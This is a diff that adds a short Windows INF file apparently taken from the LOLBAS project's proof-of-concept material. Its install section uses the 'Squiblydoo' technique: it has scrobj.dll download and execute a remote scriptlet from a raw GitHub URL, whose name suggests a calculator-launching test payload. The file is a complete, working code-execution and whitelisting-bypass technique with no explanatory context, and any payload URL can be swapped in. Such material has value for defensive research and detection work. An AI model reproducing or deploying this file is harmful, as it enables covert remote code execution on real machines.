@@ -1,0 +1,8 @@
+[Version] 
+Signature=$CHICAGO$
+
+[DefaultInstall]
+UnregisterDlls = Squiblydoo
+
+[Squiblydoo]
+11,,scrobj.dll,2,60,https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Infdefaultinstall_calc.sct
